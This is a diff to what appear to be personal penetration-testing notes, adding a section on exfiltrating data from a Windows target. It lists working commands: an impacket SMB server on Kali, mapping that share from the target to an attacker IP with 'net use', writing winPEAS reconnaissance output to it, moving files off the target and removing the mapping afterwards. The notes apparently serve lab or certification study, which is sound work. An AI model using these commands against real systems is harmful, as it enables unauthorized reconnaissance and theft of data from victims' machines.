@@ -37,4 +37,31 @@ runas /user:john "cmd.exe"
 #Elevate prompt (john may be part of admin, but if he's in a regular session he wont have permission to do stuff)
 powershell -Command "Start-Process cmd -Verb RunAs"
 
+========================================================================================
+Exfiltrate data from a windows target 
+https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration#smb
+
+Windows 10 confirmed
+on kali
+impacket-smbserver -smb2support -user test -password test test `pwd`
+
+on target
+net use z: \\192.168.45.235\test /user:test test
+
+run winPEAS and put into shared drive
+.\winPEAS.exe > z:/winpeas.txt
+
+on attacker read winPEAS with color...
+less -r winpeas.txt
+
+move files from target to attacker
+move test2.txt z:\test2.txt
+
+
+cleanup on target
+net use z: /delete
+
+
+
+
 
